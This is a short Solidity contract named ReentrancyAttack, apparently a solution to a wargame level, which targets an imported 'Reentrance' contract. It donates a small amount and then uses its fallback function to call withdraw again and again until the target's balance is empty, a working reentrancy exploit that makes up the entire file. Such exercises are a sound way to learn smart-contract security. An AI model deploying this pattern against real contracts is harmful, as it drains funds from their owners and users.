// SPDX-License-Identifier: MIT
pragma solidity ^0.6.10;

import "./Reentrance.sol";

contract ReentrancyAttack {
    Reentrance target;
    uint public amount = 10 ** 15;

    constructor(address payable _adr) public payable {
        target = Reentrance(_adr);
    }

    function donateToTarget() public {
        target.donate.value(amount).gas(4000000)(address(this));
    }

    fallback() external payable {
        if(address(target).balance!=0 ){
            target.withdraw(amount);
        }
    }
}